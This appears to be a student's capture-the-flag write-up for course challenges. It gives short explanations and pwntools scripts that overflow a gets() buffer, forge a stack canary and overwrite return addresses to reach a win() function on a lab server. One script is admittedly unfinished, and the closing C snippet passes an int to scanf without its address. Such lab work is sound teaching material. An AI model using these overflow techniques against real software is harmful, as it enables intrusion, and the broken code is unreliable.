==================================================================
jump
==================================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1qdW1wIiwiaXAiOiIxMDEuMTY0LjMzLjIxOSIsInNlc3Npb24iOiJhOWVlOWI2Mi1jOTNiLTQzOWItYjFkZC1kMzlhZTUxMmI2MTgifQ.1UwY32DXsbRwEyhlPEaBD2nyqA7g7OqQFiixenuufhk}
------------------------------------------------------------------
General overview
1. There was a buffer of size 64 for the input, I simply needed to fill this buffer up and then stick the win function address after this to overwrite the function pointer. 
2. The function used gets(&input), so overflowing the buffer was easy.
3. I found the address for win() from objdump
------------------------------------------------------------------
Program used
#! bin/env/ python

from pwn import *

p = remote("plsdonthaq.me", 2001)
# p = process("./jump")

p.recvuntil("work ?")

payload = b""
payload += "A" * (0x40)
payload += p32(0x08048536)

p.sendline(payload)

p.interactive()
==================================================================



==================================================================
blind
==================================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1ibGluZCIsImlwIjoiMTAxLjE2NC4zMy4yMTkiLCJzZXNzaW9uIjoiMjA5YzZiZWItNmI4MS00NjljLTliYjMtYTgxODE5MWE2ZGM4In0.g9Qcxi_IMooHRoZffc7kr8zB0_4gZyqhCootzMcvZic}
------------------------------------------------------------------
General overview
Essentially the same as the previous, except instead of overwriting the function pointer we had to overwrite the return address, so fill the buffer up with 8 additional bytes to bypass the other registers.
------------------------------------------------------------------
Program used
#! bin/env/ python

from pwn import *

p = remote("plsdonthaq.me", 2002)
# p = process("./blind")

p.recvuntil("jump...")

payload = b""
payload += b"A" * (0x48)
payload += p32(0x080484d6)

p.sendline(payload)

p.interactive()
==================================================================



==================================================================
best security
==================================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1iZXN0c2VjdXJpdHkiLCJpcCI6IjEwMS4xNjQuMzMuMjE5Iiwic2Vzc2lvbiI6ImVkMzQ3MDU5LTIzNGItNDZiYS04MmYwLTFjNTBmZjI2MzNjYiJ9.QSZg6f6cvp15nbw1S1IWuaf3ISOnQBhhMMNCwSCVQro}
------------------------------------------------------------------
General overview
1. I simply had to overwrite the canary address with the required canary value, I found the canary value with binary ninja as "1234" was pushed.
2. I found the offset of the canary address from the address that were being loaded into eax.
3. Finally, I simply needed to print enough random values to get to the canary address, and then print the canary value to this address.
------------------------------------------------------------------
Program used
#! /bin/env/ python

from pwn import *

p = remote("plsdonthaq.me", 2003)
# p = process("./bestsecurity")

p.recvuntil("yeah...")

payload = b""
payload += b"A" * (0x80) # 0x89 - 0x9
payload += b"1234" # canary address

p.sendline(payload)

p.interactive()
==================================================================



==================================================================
stack-dump
==================================================================
Flag: 
------------------------------------------------------------------
General overview
1. I couldn't work out the correct offsets to push the canary value into the correct spot, but I believe I was really close.
------------------------------------------------------------------
Program used
#! /bin/env/ python

from pwn import *

# p = remote("plsdonthaq.me", 2004)
p = process("./stack-dump")

# read the stack pointer provided, and use it to find the canary address
p.recvuntil("pointer")
address = p.recvuntil("a)", drop=True).strip()
address = int(address, 16) + 0 #offset

# input the canary address
p.recvuntil("quit")
p.sendline("a")

p.recvuntil("len:")
p.sendline("4")
p.sendline(p32(address))

# get the value at the canary address
p.recvuntil("quit")
p.sendline("b")

p.recvuntil(":")
canary = p.recvuntil("a)", drop=True).strip()[0:5]

# overwrite the return address
p.recvuntil("quit")
p.sendline("a")

p.recvuntil("len:")
p.sendline("96")

payload = b""
payload += b"A" * 0 # offset
payload += canary # canary value
payload += p32(0x080486c6) * (4) # address of win()
p.sendline(payload)

# the return address is overwritten, so quitting should pop the shell
p.recvuntil("quit")
p.sendline("d")

p.interactive()
==================================================================



==================================================================
reverse engineering
==================================================================
General overview
1. This seemed pretty simple, there was a call to scanf, with "%d" being pushed prior to it. So it was obviously reading in an int.
2. There was a fork after this integer was read which compared the number to 0x539. (1337)
2. After this fork, one side called puts and pushed "Bye", the other called puts and pushed "Your so leet".
------------------------------------------------------------------
Program used
int main(int argc, char **argv) {
    int input;
    scanf("%d", input);

    if (input != 1337) // 0x539
        puts("Bye");

    else
        puts("Your so leet!");
}
==================================================================
